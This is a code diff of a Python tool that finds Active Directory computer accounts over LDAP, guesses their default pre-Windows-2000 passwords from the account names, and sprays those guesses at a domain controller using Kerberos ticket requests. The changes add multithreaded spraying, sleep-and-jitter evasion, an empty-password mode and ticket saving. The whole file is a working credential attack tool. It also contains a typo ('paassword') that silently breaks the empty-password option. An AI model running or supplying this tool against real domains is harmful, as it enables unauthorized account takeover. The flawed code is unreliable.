@@ -1,3 +1,4 @@
+from ast import arg
 from impacket.smbconnection import SMBConnection
 from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
 from binascii import unhexlify
@@ -8,11 +9,15 @@ import ldap3
 import json
 import ssl
 import sys
-from impacket.krb5.kerberosv5 import getKerberosTGT
+from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
 from impacket.krb5 import constants
 from impacket.krb5.types import Principal
 import os
-
+from rich.console import Console
+from datetime import datetime
+import time
+from random import randint
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 show_banner = '''
 
@@ -29,10 +34,13 @@ show_banner = '''
 
 
 '''
+console = Console()
 
+tried = 0
+valid = 0
 
 def arg_parse():
-    parser = argparse.ArgumentParser(add_help=True, description=
+    parser = argparse.ArgumentParser(add_help=True,description=
     '''Tool to enumerate a target environment for the presence of machine accounts configured as pre-2000 Windows machines.\n
     Either by brute forcing all machine accounts, a targeted, filtered approach, or from a user supplied input list.
     ''')
@@ -40,16 +48,22 @@ def arg_parse():
     # auth_group = parser.add_argument_group("Authentication")
     # optional_group = parser.add_argument_group("Optional Flags")
 
+
     subparsers = parser.add_subparsers(dest="command", required=True)
 
     unauth_parser = subparsers.add_parser("unauth", help='Pass a list of hostnames to test authentication.')
     unauth_parser.add_argument('-d', action='store', metavar='', required=True, help="Target domain")
     unauth_parser.add_argument('-dc-ip', action='store', metavar='', help = "IP address or FQDN of domain controller", required=True)
-    unauth_parser.add_argument("-inputfile", action="store", help="Pass a list of machine accounts to validate. Format = 'machinename$'")
+    unauth_parser.add_argument("-inputfile", action="store", help="Pass a list of machine accounts to validate. Format machinename$")
     unauth_parser.add_argument("-outputfile", action="store", help="Log results to file.")
     unauth_parser.add_argument("-verbose", action="store_true", help="Verbose output displaying failed attempts.")
     unauth_parser.add_argument("-stoponsuccess", action='store_true', help="Stop on sucessful authentication")
     unauth_parser.add_argument("-save", action="store_true", help="Request and save a .ccache file to your current working directory")
+    unauth_parser.add_argument("-n", action="store_true", help="Attempt authentication with an empty password.")
+    unauth_parser.add_argument("-sleep", action="store", help="Length of time to sleep between attempts in seconds.", type=int)
+    unauth_parser.add_argument("-jitter", action="store", help="Add jitter to sleep time.", type=int)
+    unauth_parser.add_argument("-threads", action="store", help="Number of threads to spray with. Default: 10", default=10, type=int)
+
 
     auth_parser = subparsers.add_parser("auth", help="Query the domain for pre Windows 2000 machine accounts.")
     auth_parser.add_argument("-u", action='store', metavar='', help="Username")
@@ -57,15 +71,21 @@ def arg_parse():
     auth_parser.add_argument('-d', action='store', metavar='', required=True, help="Target domain")
     auth_parser.add_argument('-dc-ip', action='store', metavar='', help = "IP address or FQDN of domain controller", required=True)
     auth_parser.add_argument('-ldaps', action="store_true", help='Use LDAPS instead of LDAP')
-    auth_parser.add_argument("-k", "--kerberos", action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
+    auth_parser.add_argument("-k", action="store_true", help='Use Kerberos authentication')
     auth_parser.add_argument("-no-pass", action="store_true", help="don't ask for password (useful for -k)")
-    auth_parser.add_argument("-hashes", metavar="LMHASH:NTHASH", help="LM and NT hashes, format is LMHASH:NTHASH",)
+    auth_parser.add_argument("-hashes", action="store",metavar="LMHASH:NTHASH", help="LM and NT hashes, format is LMHASH:NTHASH",)
     auth_parser.add_argument('-aes', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
-    auth_parser.add_argument('-targeted', action="store_true", help="Search by UserAccountControl=4128. Prone to false positive/negatives but less noisy.")
+    auth_parser.add_argument('-targeted', action="store_true", help="Search for computer accounts with logoncount=0.")
     auth_parser.add_argument("-verbose", action="store_true", help="Verbose output displaying failed attempts.")
     auth_parser.add_argument("-outputfile", action="store", help="Log results to file.")
     auth_parser.add_argument("-stoponsuccess", action='store_true', help="Stop on sucessful authentication")
     auth_parser.add_argument("-save", action="store_true", help="Request and save a .ccache file to your current working directory")
+    auth_parser.add_argument("-n", action="store_true", help="Attempt authentication with an empty password.")
+    auth_parser.add_argument("-sleep", action="store", help="Length of time to sleep between attempts in seconds.", type=int)
+    auth_parser.add_argument("-jitter", action="store", help="Add jitter to sleep time.", type=int)
+    auth_parser.add_argument("-threads", action="store", help="Number of threads to spray with. Default: 10", default=10, type=int)
+
+   
 
     if len(sys.argv) == 1:
         parser.print_help()
@@ -338,30 +358,34 @@ class machinehunter:
 
     def fetch_computers(self, ldap_session):
         creds = []
-        if self.targeted:
-            search_filter = "(&(objectclass=computer)(useraccountcontrol=4128))"
-        else:
-            search_filter = "(objectclass=computer)"
-        try:
-            ldap_session.extend.standard.paged_search(self.search_base, search_filter, attributes=self.attributes, paged_size=500, generator=False)
+        num = 0
+        with console.status(f"Searching...", spinner="dots") as status:
+            if self.targeted:
+                search_filter = "(&(objectclass=computer)(logonCount=0))"
+            else:
+                search_filter = "(objectclass=computer)"
+            try:
+                ldap_session.extend.standard.paged_search(self.search_base, search_filter, attributes=self.attributes, paged_size=500, generator=False)
+                # print (f'Retrieved {len(self.ldap_session.entries)} results total.')
+            except ldap3.core.exceptions.LDAPAttributeError as e:
+                print()
+                print (f'Error: {str(e)}')
+                exit()
+            for entry in ldap_session.entries:
+                num += 1
+                status.update(f"Retrieved {num} results.")
+                json_entry = json.loads(entry.entry_to_json())
+                attributes = json_entry['attributes'].keys()
+                for attr in attributes:
+                    val = entry[attr].value
+                    if len(val) >= 15:
+                        #if account name is 15 chars or more pw is first 14
+                        credentials = val + ":" + val.lower()[:-2]
+                    else:
+                        credentials = val + ":" + val.lower()[:-1]
+                    creds.append(credentials)
             print (f'Retrieved {len(self.ldap_session.entries)} results total.')
-            print (f'Testing authentication...')
-        except ldap3.core.exceptions.LDAPAttributeError as e:
-            print()
-            print (f'Error: {str(e)}')
-            exit()
-        for entry in ldap_session.entries:
-            json_entry = json.loads(entry.entry_to_json())
-            attributes = json_entry['attributes'].keys()
-            for attr in attributes:
-                val = entry[attr].value
-                if len(val) >= 15:
-                    #if account name is 15 chars or more pw is first 14
-                    credentials = val + ":" + val.lower()[:-2]
-                else:
-                    credentials = val + ":" + val.lower()[:-1]
-                creds.append(credentials)
-        return creds
+            return creds
 
 
 def printlog(line, outputfile):
@@ -370,32 +394,82 @@ def printlog(line, outputfile):
         f.write("{}\n".format(line))
         f.close
 
-def pw_spray(creds, args):
-    for cred in creds:
-        try:
-            username, password = cred.split(":")
-            save = False
-            executer = GETTGT(username, password, args.d, args.dc_ip)
-            if args.save:
-                save=True
-            validate = executer.run(save)
-            if validate:
-                line = (f'[+] VALID CREDENTIALS: {args.d}\\{cred}')
-                print (line)
-                if args.outputfile:
-                        printlog(line, args.outputfile)
-                if args.stoponsuccess:
-                    break
-        except KeyboardInterrupt:
-            print("Stopping session...")
-            sys.exit()
-        except:
-            if args.verbose:
-                line = (f'[-] Invalid credentials: {args.d}\\{cred}')
-                print (line)
-                if args.outputfile:
-                        printlog(line, args.outputfile)
 
+def delay(sleep, jitter):
+    if sleep and jitter:
+        delay = ""
+        delay = sleep
+        jitter = jitter
+        delay = delay + (delay * (randint(1, jitter) / 100))
+        print (f'Sleeping {delay} seconds until next attempt.')
+        time.sleep(delay)
+    elif sleep and not jitter:
+        delay = ""
+        delay = sleep
+        print(f'Sleeping {delay} seconds until next attempt.')
+        time.sleep(delay)
+        
+def spray(cred, n, domain, ip, save, outputfile, accounts, status, sleep, jitter, verbose):
+    global tried
+    global valid
+    status.update(f"Tried {tried}/{accounts}. {valid} valid.")
+    tried += 1
+    username, password = cred.split(":")
+    if n:
+        paassword = ''
+    try:
+        executer = GETTGT(username, password, domain, ip)
+        validate = executer.run(save)
+    except KerberosError:
+        if verbose:
+            if n:
+                line = (f'[-] Invalid credentials: {domain}\\{username}:nopass')
+            else:
+                line = (f'[-] Invalid credentials: {domain}\\{cred}')
+            print (line)
+            if outputfile:
+                    printlog(line, outputfile)
+        delay(sleep, jitter)
+        return False
+    if validate:
+        valid += 1
+        if n:
+            line = (f'[+] VALID CREDENTIALS: {domain}\\{username}:nopass')
+        else:                        
+            line = (f'[+] VALID CREDENTIALS: {domain}\\{cred}')
+        print (line)
+        if outputfile:
+                printlog(line, outputfile)
+        
+        delay(sleep, jitter)
+        return True
+
+def pw_spray(creds, args):
+    dt = datetime.now()
+    print("Testing started at", dt)
+    if args.n: 
+        print("Testing with empty password.")
+    with console.status(f"", spinner="dots") as status:
+        valid = 0
+        accounts = len(creds)
+        if args.sleep:
+            args.threads = 1 # no point in threading if we're sleeping b/w attempts
+        with ThreadPoolExecutor(max_workers=args.threads) as pool:
+            try:
+                # queue the jobs
+                future_validate = {pool.submit(spray, cred, args.n, args.d, args.dc_ip, args.save, args.outputfile, accounts, status, args.sleep, args.jitter, args.verbose): cred for cred in creds}
+                
+                # as threads complete, check if we should be stopping
+                for validate in as_completed(future_validate):
+                    if validate._result and args.stoponsuccess:
+                        print("Valid credential found! Stopping session...")
+                        pool.shutdown(wait=False, cancel_futures=True)
+                        sys.exit()
+                        
+            except KeyboardInterrupt:
+                print("Stopping session...")
+                sys.exit()
+            
 
 def parse_input(inputfile, args):
     creds = []
@@ -411,6 +485,7 @@ def parse_input(inputfile, args):
         pw_spray(creds, args)
 
 def main():
+    dt = datetime.now()
     print(show_banner)
     args = arg_parse()
     if args.command == "unauth":
@@ -424,9 +499,10 @@ def main():
             args.lmhash, args.nthash = args.hashes.split(':')
         if not (args.p or args.lmhash or args.nthash or args.aes or args.no_pass):
                 args.p = getpass("Password:")
+        creds = 0
 
         try:
-            ldap_server, ldap_session = init_ldap_session(domain=args.d, username=args.u, password=args.p, lmhash=args.lmhash, nthash=args.nthash, kerberos=args.kerberos, domain_controller=args.dc_ip, aesKey=args.aes, hashes=args.hashes, ldaps=args.ldaps
+            ldap_server, ldap_session = init_ldap_session(domain=args.d, username=args.u, password=args.p, lmhash=args.lmhash, nthash=args.nthash, kerberos=args.k, domain_controller=args.dc_ip, aesKey=args.aes, hashes=args.hashes, ldaps=args.ldaps
  )
         except ldap3.core.exceptions.LDAPSocketOpenError as e: 
             if 'invalid server address' in str(e):
